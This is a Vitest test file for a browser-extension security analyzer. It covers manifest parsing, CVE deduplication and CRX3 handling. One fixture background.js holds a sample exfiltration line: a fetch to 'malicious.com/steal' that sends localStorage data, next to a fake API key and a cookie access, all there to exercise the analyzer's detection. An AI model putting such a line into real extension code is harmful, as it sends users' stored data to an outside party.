import { describe, it, expect } from 'vitest';
import { analyzeExtension } from '../analyzer';
import fs from 'fs';
import path from 'path';

describe('analyzer', () => {
  it('should analyze a basic extension', async () => {
    const zipBuffer = fs.readFileSync(path.resolve(process.cwd(), 'test_extension.zip'));
    const result = await analyzeExtension(zipBuffer);

    expect(result.name).toBe('Test Extension');
    expect(result.version).toBe('1.0');
    expect(result.permissions).toContainEqual(expect.objectContaining({ permission: 'tabs' }));
    expect(result.permissions).toContainEqual(expect.objectContaining({ permission: 'storage' }));
  });

  it('should detect API calls and secrets', async () => {
    const JSZip = (await import('jszip')).default;
    const zip = new JSZip();
    zip.file('manifest.json', JSON.stringify({
      name: 'Sensitive Extension',
      version: '1.0',
      manifest_version: 3,
      permissions: ['cookies']
    }));
    zip.file('background.js', `
      chrome.cookies.get({ name: 'session' });
      const api_key = "AIzaSyB-123456789012345678901234567890";
      fetch('https://malicious.com/steal?data=' + localStorage.getItem('data'));
    `);

    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });
    const result = await analyzeExtension(zipBuffer);

    expect(result.apiCalls).toContain('chrome.cookies');
    expect(result.apiCalls).toContain('fetch(');
    expect(result.apiCalls).toContain('localStorage');
    expect(result.secrets.length).toBeGreaterThan(0);
    expect(result.riskLevel).toBe('Medium');
  });

  it('should deduplicate vulnerabilities', async () => {
    const JSZip = (await import('jszip')).default;
    const zip = new JSZip();
    zip.file('manifest.json', JSON.stringify({
      name: 'Vulnerable Extension',
      version: '1.0',
      manifest_version: 3
    }));
    zip.file('jquery-1.js', '');
    zip.file('jquery-2.js', '');

    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });
    const result = await analyzeExtension(zipBuffer);

    const jqueryCVEs = result.vulnerabilities.filter(v => v.id === 'CVE-2020-11022');
    expect(jqueryCVEs.length).toBe(1);
  });

  it('should handle CRX files (v3)', async () => {
    const JSZip = (await import('jszip')).default;
    const zip = new JSZip();
    zip.file('manifest.json', JSON.stringify({
      name: 'CRX Extension',
      version: '1.0',
      manifest_version: 3
    }));
    const zipBuffer = await zip.generateAsync({ type: 'uint8array' });

    // Create a fake CRX3 header
    const headerLength = 10;
    const crxBuffer = new Uint8Array(12 + headerLength + zipBuffer.length);
    const view = new DataView(crxBuffer.buffer);
    view.setUint32(0, 0x34327243, true); // 'Cr24'
    view.setUint32(4, 3, true); // version 3
    view.setUint32(8, headerLength, true); // header length
    crxBuffer.set(zipBuffer, 12 + headerLength);

    const result = await analyzeExtension(crxBuffer);
    expect(result.name).toBe('CRX Extension');
  });
});
